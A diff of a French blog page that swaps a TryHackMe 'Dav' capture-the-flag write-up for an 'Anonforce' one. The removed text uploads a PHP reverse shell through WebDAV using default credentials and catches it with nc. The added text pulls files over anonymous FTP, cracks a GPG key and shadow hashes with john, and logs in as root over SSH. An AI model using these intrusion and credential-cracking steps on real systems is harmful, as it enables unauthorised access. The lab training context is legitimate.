@@ -5,18 +5,18 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Ce write-up sera dédié à la room Dav, sur Try Hack Me.
-Reconnaissance Je commence par un scan de ports avec nmap :
-$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST Nmap scan report for 10.10.239.64 Host is up (0.065s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Il semblerait n&amp;rsquo;y avoir qu&amp;rsquo;un serveur Apache sur le port 80." />
+<meta name="description" content="Ce write-up sera sur la room Anonforce de Try Hack Me. Elle est dans la catégorie &amp;ldquo;Easy&amp;rdquo;.
+Reconnaissance Comme à l&amp;rsquo;habitude, un petit nmap pour commencer :
+$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST Nmap scan report for 10.10.170.171 Host is up (0.061s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jul 08 13:57 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd." />
 <meta name="keywords" content=", writeup, tryhackme" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://blog.hugoblanc.com/posts/dav-writeup/" />
+<link rel="canonical" href="https://blog.hugoblanc.com/posts/anonforce-writeup/" />
 
 
     <title>
         
-            Write-up | Dav :: ezekiel&#39;s blog 
+            Write-up | Anonforce :: ezekiel&#39;s blog 
         
     </title>
 
@@ -34,13 +34,13 @@ $ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap
 
 
 
-<meta itemprop="name" content="Write-up | Dav">
-<meta itemprop="description" content="Ce write-up sera dédié à la room Dav, sur Try Hack Me.
-Reconnaissance Je commence par un scan de ports avec nmap :
-$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST Nmap scan report for 10.10.239.64 Host is up (0.065s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Il semblerait n&rsquo;y avoir qu&rsquo;un serveur Apache sur le port 80.">
-<meta itemprop="datePublished" content="2020-07-08T22:35:00&#43;02:00" />
-<meta itemprop="dateModified" content="2020-07-08T22:35:00&#43;02:00" />
-<meta itemprop="wordCount" content="472">
+<meta itemprop="name" content="Write-up | Anonforce">
+<meta itemprop="description" content="Ce write-up sera sur la room Anonforce de Try Hack Me. Elle est dans la catégorie &ldquo;Easy&rdquo;.
+Reconnaissance Comme à l&rsquo;habitude, un petit nmap pour commencer :
+$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST Nmap scan report for 10.10.170.171 Host is up (0.061s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jul 08 13:57 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.">
+<meta itemprop="datePublished" content="2020-07-09T00:12:57&#43;02:00" />
+<meta itemprop="dateModified" content="2020-07-09T00:12:57&#43;02:00" />
+<meta itemprop="wordCount" content="683">
 <meta itemprop="image" content="https://blog.hugoblanc.com/"/>
 
 
@@ -49,29 +49,29 @@ $ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://blog.hugoblanc.com/"/>
 
-<meta name="twitter:title" content="Write-up | Dav"/>
-<meta name="twitter:description" content="Ce write-up sera dédié à la room Dav, sur Try Hack Me.
-Reconnaissance Je commence par un scan de ports avec nmap :
-$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST Nmap scan report for 10.10.239.64 Host is up (0.065s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Il semblerait n&rsquo;y avoir qu&rsquo;un serveur Apache sur le port 80."/>
+<meta name="twitter:title" content="Write-up | Anonforce"/>
+<meta name="twitter:description" content="Ce write-up sera sur la room Anonforce de Try Hack Me. Elle est dans la catégorie &ldquo;Easy&rdquo;.
+Reconnaissance Comme à l&rsquo;habitude, un petit nmap pour commencer :
+$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST Nmap scan report for 10.10.170.171 Host is up (0.061s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jul 08 13:57 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd."/>
 
 
 
-    <meta property="og:title" content="Write-up | Dav" />
-<meta property="og:description" content="Ce write-up sera dédié à la room Dav, sur Try Hack Me.
-Reconnaissance Je commence par un scan de ports avec nmap :
-$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST Nmap scan report for 10.10.239.64 Host is up (0.065s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Il semblerait n&rsquo;y avoir qu&rsquo;un serveur Apache sur le port 80." />
+    <meta property="og:title" content="Write-up | Anonforce" />
+<meta property="og:description" content="Ce write-up sera sur la room Anonforce de Try Hack Me. Elle est dans la catégorie &ldquo;Easy&rdquo;.
+Reconnaissance Comme à l&rsquo;habitude, un petit nmap pour commencer :
+$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST Nmap scan report for 10.10.170.171 Host is up (0.061s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jul 08 13:57 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.hugoblanc.com/posts/dav-writeup/" />
+<meta property="og:url" content="https://blog.hugoblanc.com/posts/anonforce-writeup/" />
 <meta property="og:image" content="https://blog.hugoblanc.com/"/>
-<meta property="article:published_time" content="2020-07-08T22:35:00+02:00" />
-<meta property="article:modified_time" content="2020-07-08T22:35:00+02:00" /><meta property="og:site_name" content="ezekiel&#39;s blog" />
+<meta property="article:published_time" content="2020-07-09T00:12:57+02:00" />
+<meta property="article:modified_time" content="2020-07-09T00:12:57+02:00" /><meta property="og:site_name" content="ezekiel&#39;s blog" />
 
 
 
 
 
 
-    <meta property="article:published_time" content="2020-07-08 22:35:00 &#43;0200 CEST" />
+    <meta property="article:published_time" content="2020-07-09 00:12:57 &#43;0200 CEST" />
 
 
 
@@ -137,7 +137,7 @@ $ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        3 minutes
+        4 minutes
 
         
       </p>
@@ -145,79 +145,116 @@ $ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt Starting Nmap 7.80 ( https://nmap
 
     <article>
       <h1 class="post-title">
-        <a href="https://blog.hugoblanc.com/posts/dav-writeup/">Write-up | Dav</a>
+        <a href="https://blog.hugoblanc.com/posts/anonforce-writeup/">Write-up | Anonforce</a>
       </h1>
 
       
 
       <div class="post-content">
-        <p>Ce write-up sera dédié à la room Dav, sur <a href="https://tryhackme.com">Try Hack Me</a>.</p>
+        <p>Ce write-up sera sur la room Anonforce de <a href="https://tryhackme.com">Try Hack Me</a>. Elle est dans la catégorie &ldquo;Easy&rdquo;.</p>
 <h2 id="reconnaissance">Reconnaissance</h2>
-<p>Je commence par un scan de ports avec <code>nmap</code> :</p>
-<pre><code>$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST
-Nmap scan report for 10.10.239.64
-Host is up (0.065s latency).
-Not shown: 999 closed ports
+<p>Comme à l&rsquo;habitude, un petit <code>nmap</code> pour commencer :</p>
+<pre><code>$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST
+Nmap scan report for 10.10.170.171
+Host is up (0.061s latency).
+Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-</code></pre><p>Il semblerait n&rsquo;y avoir qu&rsquo;un serveur Apache sur le port 80. Je passe à l&rsquo;énumération avec <code>gobuster</code> :</p>
-<pre><code>/webdav
-</code></pre><p>En cherchant sur Internet, je tombe sur <a href="http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html">ce site</a> qui indique que les creds par défaut sont <code>wampp:xampp</code>. Nous sommes chanceux, ils n&rsquo;ont pas été changés :)
-Une fois sur la page, il y a un fichier nommé <code>passwd.dav</code> qui contient <code>wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</code>.
-<code>hash-identifier</code> indique que ce hash correspond à du MD5(APR).</p>
-<p>Sur <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat.net</a>, je trouve que le mode correspondant pour <code>hashcat</code> est 1600.</p>
-<pre><code>$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
-...
-Session..........: hashcat                       
-Status...........: Exhausted
-Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
-Hash.Target......: $apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
-Time.Started.....: Wed Jul  8 19:28:37 2020 (11 mins, 36 secs)
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:    20401 H/s (12.29ms) @ Accel:64 Loops:500 Thr:1 Vec:8
-Recovered........: 0/1 (0.00%) Digests
-Progress.........: 14344385/14344385 (100.00%)
-Rejected.........: 0/14344385 (0.00%)
-</code></pre><p>Tout <code>rockyou.txt</code> sera passé sur ce hash, et rien. J&rsquo;ai remis une couche avec <code>john</code> et toujours rien.</p>
-<p>J&rsquo;utilise alors <code>searchploit</code> pour voir si il y a des vulnérabilité connues de ce service :</p>
-<pre><code>$ searchsploit webdav
-...
-XAMPP - WebDAV PHP Upload (Metasploit) | windows/remote/18367.rb
-</code></pre><p>C&rsquo;est plutôt bon signe :)</p>
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+| drwxr-xr-x   17 0        0            3700 Jul 08 13:57 dev
+| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -&gt; boot/initrd.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.37.193
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
+|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
+|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Déjà des bonnes nouvelles ! On peut se connecter au service FTP avec les creds de base (anonymous et pas de password).</p>
 <h2 id="exploitation">Exploitation</h2>
-<p>J&rsquo;utilise l&rsquo;<em>exploit</em> <code>windows/http/xampp_webdav_upload_php</code> sur <code>metasploit</code>. Après l&rsquo;avoir exécuté, j&rsquo;ai bien les 2 fichiers PHP qui sont sur le serveur, mais aucun reverse shell ne se créé.</p>
-<p>Changement de plan : je récupère un reverse shell en PHP <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">ici</a>, puis utilise <code>cadaver</code> pour l&rsquo;uploader :</p>
-<pre><code>$ cadaver http://10.10.239.64/webdav/
-Authentication required for webdav on server `10.10.239.64':
-Username: wampp
-Password: 
-dav:/webdav/&gt; put revshell.php 
-Uploading revshell.php to `/webdav/revshell.php':
-Progress: [=============================&gt;] 100,0% of 3458 bytes succeeded.
-</code></pre><p>Succès ! Je lance <code>nc</code> sur un autre terminal et j&rsquo;ouvre le fichier PHP fraichement uploadé :</p>
-<pre><code>$ nc -nlvp 4444
-listening on [any] 4444 ...
-connect to [10.8.37.193] from (UNKNOWN) [10.10.239.64] 50860
-Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+<pre><code>$ ftp 10.10.170.171
+Connected to 10.10.170.171.
+220 (vsFTPd 3.0.3)
+Name (10.10.170.171:paradox): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls /home
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+226 Directory send OK.
+</code></pre><p>Il y a un seul user dans <code>/home</code> : melodias. Le flag <code>user.txt</code> est dans dossier, mais on ne peut pas y accéder.</p>
+<p>Il est cependant possible de le récupérer via <code>wget</code> :</p>
+<pre><code>$ wget -m ftp://anonymous:anonymous@10.10.170.171:/home/melodias/*
+--2020-07-08 21:11:17--  ftp://anonymous:*password*@10.10.170.171/home/melodias/* =&gt; « 10.10.170.171/home/melodias/.listing »
+Connexion à 10.10.170.171:21… connecté.
+Ouverture de session en tant que anonymous… Session établie.
 ...
-$ whoami
-www-data
-</code></pre><p>J&rsquo;explore le <code>/home</code>, et je trouve l&rsquo;utilisateur <code>merlin</code>, qui a le flag <code>user.txt</code> :</p>
-<pre><code>$ cat /home/merlin/user.txt
+Terminé — 2020-07-08 21:11:21 —
+Temps total effectif : 3,7s
+Téléchargés : 8 fichiers, 5,6K en 0,2s (25,4 KB/s)
+</code></pre><p>Il n&rsquo;y a plus qu&rsquo;à lire le flag <code>user.txt</code> sur sa machine !
+J&rsquo;essaie de récupérer le fichier <code>shadow</code> de la même manière mais impossible. Je récupère malgré tout <code>passwd</code>, mais il ne me sert à pas grand chose.</p>
+<p>Avec un peu d&rsquo;attention, on remarque la présence d&rsquo;un dossier <code>notread</code> à la racine. Ce dossier contient 2 fichiers : <code>private.asc</code> et <code>backup.pgp</code>.</p>
+<p>Avec <code>john</code>, on peut bruteforcer assez facilement un clé GPG.</p>
+<pre><code>$ sudo gpg2john private.asc &gt; hash
+
+File private.asc
+
+$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+...
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[edited]          (anonforce)
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Nous voilà donc en possession de la clé ! On va pouvoir ouvrir <code>backup.gpg</code> :</p>
+<pre><code>$ gpg --import private.asc 
+gpg: clef B92CD1F280AD82C2 : « anonforce &lt;melodias@anonforce.nsa&gt; » n'est pas modifiée
+gpg: clef B92CD1F280AD82C2 : clef secrète importée
+
+$ gpg --decrypt backup.pgp
+...
+      « anonforce &lt;melodias@anonforce.nsa&gt; »
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+...
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+...
+</code></pre><p>Nous avons donc le <code>shadow</code> de la machine ! Avec le fichier <code>passwd</code> récupéré avant, il est possible de bruteforcer le password root !</p>
+<pre><code>$ sudo unshadow passwd shadow.txt &gt; out.txt
+$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt out.txt
+... 
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[edited]           (root)
+...
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>On trouve bien le mot de passe root. J&rsquo;essaie de me connecter en SSH en tant que root, et ça marche ! Plus qu&rsquo;à lire <code>root.txt</code> :</p>
+<pre><code># cat /root/root.txt 
 [edited]
-</code></pre><h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
-<p>J&rsquo;effectue le traditionnel <code>sudo -l</code>:</p>
-<pre><code>User www-data may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /bin/cat
-</code></pre><p>C&rsquo;est presque trop facile :p</p>
-<pre><code>$ sudo cat /root/root.txt
-[edited]
-</code></pre><p>Et voilà, la room est terminée !</p>
-<p>Je l&rsquo;ai trouvé super sympa à faire, la difficultée est bien calibrée pour débuter les CTF. Petite dédicace au hash qui m&rsquo;a fait perdre un peu de temps :D</p>
+</code></pre><p>:)</p>
+<p>Une petite room assez facile, mais vraiment sympa !</p>
 
       </div>
     </article>
@@ -240,7 +277,7 @@ www-data
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        472 Words
+        683 Words
       </p>
 
       <p>
@@ -250,13 +287,13 @@ www-data
           <line x1="8" y1="2" x2="8" y2="6"></line>
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
-        2020-07-08 22:35 &#43;0200
+        2020-07-09 00:12 &#43;0200
       </p>
     </div>
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -264,7 +301,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -273,7 +310,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Write-up%20%7c%20Dav&amp;caption=Write-up%20%7c%20Dav&amp;canonicalUrl=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Write-up%20%7c%20Anonforce&amp;caption=Write-up%20%7c%20Anonforce&amp;canonicalUrl=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -282,7 +319,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Write-up%20%7c%20Dav&amp;body=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Write-up%20%7c%20Anonforce&amp;body=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -290,7 +327,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f&amp;media=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f;description=Write-up%20%7c%20Dav" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f&amp;media=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f;description=Write-up%20%7c%20Anonforce" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -298,7 +335,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f&amp;title=Write-up%20%7c%20Dav&amp;summary=Write-up%20%7c%20Dav&amp;source=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f&amp;title=Write-up%20%7c%20Anonforce&amp;summary=Write-up%20%7c%20Anonforce&amp;source=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -306,7 +343,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f&amp;resubmit=true&amp;title=Write-up%20%7c%20Dav" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f&amp;resubmit=true&amp;title=Write-up%20%7c%20Anonforce" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
